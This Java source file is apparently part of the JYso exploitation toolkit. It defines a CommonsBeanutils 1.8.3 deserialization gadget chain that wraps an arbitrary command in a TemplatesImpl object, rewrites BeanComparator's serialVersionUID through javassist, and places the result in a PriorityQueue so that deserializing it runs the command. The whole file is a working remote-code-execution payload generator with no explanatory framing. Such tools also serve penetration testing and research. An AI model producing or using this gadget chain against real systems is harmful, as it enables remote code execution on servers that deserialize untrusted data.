package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.qi4l.JYso.gadgets.utils.SuClassLoader;
import javassist.ClassClassPath;
import javassist.CtClass;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.qi4l.JYso.gadgets.Config.Config.POOL;
import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;

@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
public class CommonsBeanutils2183NOCC implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // 修改BeanComparator类的serialVersionUID
        POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");

        insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

        final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
        setFieldValue(comparator, "property", "lowestSetBit");
        PriorityQueue<Object> queue = new PriorityQueue(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        setFieldValue(comparator, "property", "outputProperties");
        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        return queue;
    }
}

